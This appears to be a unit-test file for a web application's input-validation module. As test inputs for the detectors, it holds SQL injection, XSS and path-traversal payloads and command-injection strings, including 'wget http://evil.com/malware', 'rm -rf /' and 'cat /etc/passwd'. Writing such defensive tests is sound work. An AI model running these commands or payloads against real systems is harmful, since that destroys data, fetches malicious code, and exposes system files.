// ═══════════════════════════════════════════════════════════════════
// Unit Tests: Input Validator (src/lib/security/input-validator.ts)
// Tests SQL injection detection, XSS detection, path traversal,
// command injection, file upload validation, and comprehensive validation
// ═══════════════════════════════════════════════════════════════════

import { describe, it, expect } from 'vitest';
import {
  detectSqlInjection,
  detectXss,
  sanitizeXss,
  detectPathTraversal,
  detectCommandInjection,
  validateInput,
  sanitizeInput,
  validateFileUpload,
  sanitizeFilename,
} from '@/lib/security/input-validator';

describe('input-validator', () => {
  // ── SQL Injection Detection ────────────────────────────────────

  describe('detectSqlInjection', () => {
    it('should detect SELECT ... FROM pattern', () => {
      expect(detectSqlInjection('SELECT * FROM users')).toBe(true);
    });

    it('should detect UNION SELECT pattern', () => {
      expect(detectSqlInjection("' UNION SELECT * FROM passwords--")).toBe(true);
    });

    it('should detect OR 1=1 pattern', () => {
      expect(detectSqlInjection("' OR 1=1--")).toBe(true);
    });

    it('should detect DROP TABLE pattern', () => {
      expect(detectSqlInjection("'; DROP TABLE users;--")).toBe(true);
    });

    it('should detect SLEEP() pattern', () => {
      expect(detectSqlInjection("'; SLEEP(5)--")).toBe(true);
    });

    it('should not flag normal text as SQL injection', () => {
      expect(detectSqlInjection('Hello, how are you?')).toBe(false);
    });

    it('should not flag normal search queries', () => {
      expect(detectSqlInjection('lead discovery for startups')).toBe(false);
    });

    it('should handle non-string input', () => {
      expect(detectSqlInjection(123 as unknown as string)).toBe(false);
      expect(detectSqlInjection(null as unknown as string)).toBe(false);
    });
  });

  // ── XSS Detection ──────────────────────────────────────────────

  describe('detectXss', () => {
    it('should detect <script> tags', () => {
      expect(detectXss('<script>alert("xss")</script>')).toBe(true);
    });

    it('should detect <iframe> tags', () => {
      expect(detectXss('<iframe src="evil.com"></iframe>')).toBe(true);
    });

    it('should detect javascript: URLs', () => {
      expect(detectXss('javascript:alert(1)')).toBe(true);
    });

    it('should detect event handlers (onclick)', () => {
      expect(detectXss('<div onclick="alert(1)">click</div>')).toBe(true);
    });

    it('should detect onerror handler on img', () => {
      expect(detectXss('<img src=x onerror=alert(1)>')).toBe(true);
    });

    it('should detect <object> tags', () => {
      expect(detectXss('<object data="evil.swf">')).toBe(true);
    });

    it('should not flag safe HTML', () => {
      expect(detectXss('<p>Hello world</p>')).toBe(false);
    });

    it('should not flag plain text', () => {
      expect(detectXss('Just a normal string')).toBe(false);
    });

    it('should handle non-string input', () => {
      expect(detectXss(42 as unknown as string)).toBe(false);
    });
  });

  // ── XSS Sanitization ──────────────────────────────────────────

  describe('sanitizeXss', () => {
    it('should remove script tags', () => {
      expect(sanitizeXss('<script>alert("xss")</script>')).toBe('');
    });

    it('should remove iframe tags', () => {
      const result = sanitizeXss('<iframe src="evil.com"></iframe>');
      expect(result).not.toContain('<iframe');
    });

    it('should remove event handlers', () => {
      const result = sanitizeXss('<div onclick="alert(1)">click</div>');
      expect(result).not.toContain('onclick');
    });

    it('should remove javascript: URLs', () => {
      const result = sanitizeXss('javascript:alert(1)');
      expect(result).not.toContain('javascript');
    });

    it('should preserve safe content', () => {
      expect(sanitizeXss('Hello <b>world</b>')).toContain('Hello');
      expect(sanitizeXss('Hello <b>world</b>')).toContain('world');
    });

    it('should handle non-string input by returning as-is', () => {
      expect(sanitizeXss(123 as unknown as string)).toBe(123);
    });
  });

  // ── Path Traversal Detection ──────────────────────────────────

  describe('detectPathTraversal', () => {
    it('should detect ../ pattern', () => {
      expect(detectPathTraversal('../../../etc/passwd')).toBe(true);
    });

    it('should detect ..\\ pattern', () => {
      expect(detectPathTraversal('..\\..\\windows\\system32')).toBe(true);
    });

    it('should detect URL-encoded ../ pattern', () => {
      expect(detectPathTraversal('%2e%2e%2f')).toBe(true);
    });

    it('should detect mixed encoding', () => {
      expect(detectPathTraversal('%2e%2e/')).toBe(true);
    });

    it('should not flag normal file paths', () => {
      expect(detectPathTraversal('uploads/document.pdf')).toBe(false);
    });

    it('should not flag simple filenames', () => {
      expect(detectPathTraversal('report.pdf')).toBe(false);
    });

    it('should handle non-string input', () => {
      expect(detectPathTraversal(42 as unknown as string)).toBe(false);
    });
  });

  // ── Command Injection Detection ───────────────────────────────

  describe('detectCommandInjection', () => {
    it('should detect pipe commands', () => {
      expect(detectCommandInjection('ls | cat /etc/passwd')).toBe(true);
    });

    it('should detect semicolon chaining', () => {
      expect(detectCommandInjection('ls; rm -rf /')).toBe(true);
    });

    it('should detect backtick execution', () => {
      expect(detectCommandInjection('`whoami`')).toBe(true);
    });

    it('should detect common commands', () => {
      expect(detectCommandInjection('wget http://evil.com/malware')).toBe(true);
    });

    it('should detect sudo usage', () => {
      expect(detectCommandInjection('sudo rm -rf /')).toBe(true);
    });

    it('should not flag normal text', () => {
      expect(detectCommandInjection('Hello, how are you?')).toBe(false);
    });
  });

  // ── Comprehensive validateInput ───────────────────────────────

  describe('validateInput', () => {
    it('should detect SQL injection threats', () => {
      const result = validateInput("'; DROP TABLE users;--", 'query');
      expect(result.valid).toBe(false);
      expect(result.threats).toContain('sql_injection');
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it('should detect XSS threats', () => {
      const result = validateInput('<script>alert(1)</script>', 'content');
      expect(result.valid).toBe(false);
      expect(result.threats).toContain('xss');
    });

    it('should detect path traversal threats', () => {
      const result = validateInput('../../../etc/passwd', 'filepath');
      expect(result.valid).toBe(false);
      expect(result.threats).toContain('path_traversal');
    });

    it('should return valid for safe input', () => {
      const result = validateInput('Hello, this is safe input!', 'message');
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
      expect(result.threats).toHaveLength(0);
    });

    it('should detect multiple threats in one input', () => {
      const result = validateInput('<script>SELECT * FROM users;../../../etc/passwd</script>');
      expect(result.valid).toBe(false);
      expect(result.threats.length).toBeGreaterThanOrEqual(2);
    });

    it('should include field name in error messages', () => {
      const result = validateInput('<script>alert(1)</script>', 'bio');
      expect(result.errors[0]).toContain('bio');
    });
  });

  // ── sanitizeInput ─────────────────────────────────────────────

  describe('sanitizeInput', () => {
    it('should sanitize XSS patterns', () => {
      const result = sanitizeInput('<script>alert(1)</script>Hello');
      expect(result).not.toContain('<script');
      expect(result).toContain('Hello');
    });
  });

  // ── File Upload Validation ────────────────────────────────────

  describe('validateFileUpload', () => {
    it('should accept valid image files', () => {
      const result = validateFileUpload({
        filename: 'photo.jpg',
        mimeType: 'image/jpeg',
        size: 1024 * 100, // 100KB
      });
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject files exceeding size limit', () => {
      const result = validateFileUpload({
        filename: 'huge.pdf',
        mimeType: 'application/pdf',
        size: 15 * 1024 * 1024, // 15MB
      });
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('exceeds limit'))).toBe(true);
    });

    it('should reject empty files', () => {
      const result = validateFileUpload({
        filename: 'empty.txt',
        mimeType: 'text/plain',
        size: 0,
      });
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('File is empty');
    });

    it('should reject disallowed MIME types', () => {
      const result = validateFileUpload({
        filename: 'malware.exe',
        mimeType: 'application/x-executable',
        size: 1024,
      });
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('not allowed'))).toBe(true);
    });

    it('should reject double extensions', () => {
      const result = validateFileUpload({
        filename: 'image.jpg.php',
        mimeType: 'image/jpeg',
        size: 1024,
      });
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Double file extensions are not allowed');
    });

    it('should accept PDF documents', () => {
      const result = validateFileUpload({
        filename: 'report.pdf',
        mimeType: 'application/pdf',
        size: 1024 * 500, // 500KB
      });
      expect(result.valid).toBe(true);
    });
  });

  // ── sanitizeFilename ──────────────────────────────────────────

  describe('sanitizeFilename', () => {
    it('should remove dangerous characters', () => {
      expect(sanitizeFilename('file<>:"/\\|?*name.txt')).not.toContain('<');
      expect(sanitizeFilename('file<>:"/\\|?*name.txt')).not.toContain('>');
    });

    it('should remove path traversal sequences', () => {
      expect(sanitizeFilename('../../../etc/passwd')).not.toContain('..');
    });

    it('should replace spaces with underscores', () => {
      expect(sanitizeFilename('my document.pdf')).toBe('my_document.pdf');
    });

    it('should limit filename length to 255 characters', () => {
      const longName = 'a'.repeat(300) + '.txt';
      expect(sanitizeFilename(longName).length).toBeLessThanOrEqual(255);
    });

    it('should not allow filenames starting with a dot', () => {
      expect(sanitizeFilename('.hidden').startsWith('_')).toBe(true);
    });
  });
});
